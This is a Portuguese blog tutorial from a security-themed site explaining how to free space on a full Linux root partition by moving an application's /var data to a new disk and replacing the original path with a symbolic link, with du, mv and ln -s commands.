target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Godes</span></a></div><small class="avatar__subtitle" itemprop="description">Defesa Cibern√©tica</small></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p><a href="https://en.wikipedia.org/wiki/Symbolic_link#Storage_of_symbolic_links" target="_blank" rel="noopener noreferrer">Symbolic link - Wikipedia</a></p><p><a href="https://linuxconfig.org/how-to-save-space-with-symlinks-and-mount-points" target="_blank" rel="noopener noreferrer">How to save space with-ymlinks</a></p><p><img loading="lazy" alt="Disk" src="/assets/images/disk-ace4ff95ff532084ecc5f79400c94202.png" width="264" height="314" class="img_ev3q"> Muitas vezes o disco fica cheio, e diante da impossibilidade de expandir a parti√ß√£o raiz, podemos optar pela combina√ß√£o de adi√ß√£o de um novo disco com o uso de links simb√≥licos. Observe o desenho, a fim de entender a situa√ß√£o problema;
Num primeiro momento, voc√™ apenas sabe que sua aplica√ß√£o n√£o consegue mais escrever em arquivos, pois o disco est√° cheio. Bom, podemos usar o comando abaixo, para achar qual diret√≥rio est√° ocupando mais espa√ßo: </p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">du</span><span class="token plain"> -d </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> -cha / </span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/dev/null </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> -E </span><span class="token string" style="color:#e3116c">&#x27;G|M&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>E supondo que voc√™ descobriu que o diret√≥rio era de fato da sua aplica√ß√£o no <code>/var</code> , e n√£o h√° como expandir o volume, nem a parti√ß√£o raiz configurada, diante disso, podemos fazer a sua aplica√ß√£o achar que est√° armazenando no <code>/var/aplica√ß√£o</code> , quando na verdade, esta sendo usado o espa√ßo dispon√≠vel no disco rec√©m adicionado (referenciado na imagem, como <code>/dev/sdb1</code>).</p><p><img loading="lazy" alt="disk2" src="/assets/images/disk2-d7ea3f600560c8c9a6d5621b5fc12718.png" width="502" height="443" class="img_ev3q"></p><p>Adicione o novo disco, monte em um diret√≥rio qualquer, pare a sua aplica√ß√£o, e mova os arquivos para o novo diret√≥rio (talvez bata um medo, rsrs):</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/init.d/aplica√ß√£o stop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> /var/aplica√ß√£o /disconovo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ln</span><span class="token plain"> -s /disconovo/aplica√ß√£o /var/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Agora <code>/var/aplica√ß√£o</code> √© apenas um link simb√≥lico, como um atalho na sua √°rea de trabalho.</p><p><img loading="lazy" alt="disk3" src="/assets/images/disk3-4d62a8d39fa1a77c0ab7d633335c980b.png" width="502" height="443" class="img_ev3q"></p><p>Se voc√™ fizer <code>ln -s /var/aplicacao /var/link</code>, ent√£o <code>/var/link</code> ser√° um arquivo que ir√° fazer referencia ao conte√∫do de <code>/var/aplicacao</code>. Logo <code>ls /var/link</code>, tentar√° obter uma listagem de diret√≥rios para <code>/var/link</code>, e o sistema devolver√° uma listagem do conte√∫do de <code>/var/aplicacao</code>.</p><p>O mesmo serve na hora de escrever os arquivos.</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Marcadores:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/pratica">pr√°tica</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/tutorial">tutorial</a></li></ul></div></footer></article><nav class="pagination-nav" aria-label="Navega√ß√£o da p√°gina de listagem do blog"></nav></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Conte√∫do</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Hunt</a></li><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li></ul></div><div class="col footer__col"><div class="footer__title">Contato</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://discord.com/channels/gabreell" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Mais</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/imgodes" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright ¬© 2023 Security Stuff.</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3ab79198.js"></script>
<script src="/assets/js/main.b56f07bf.js"></script>
</body>
</html>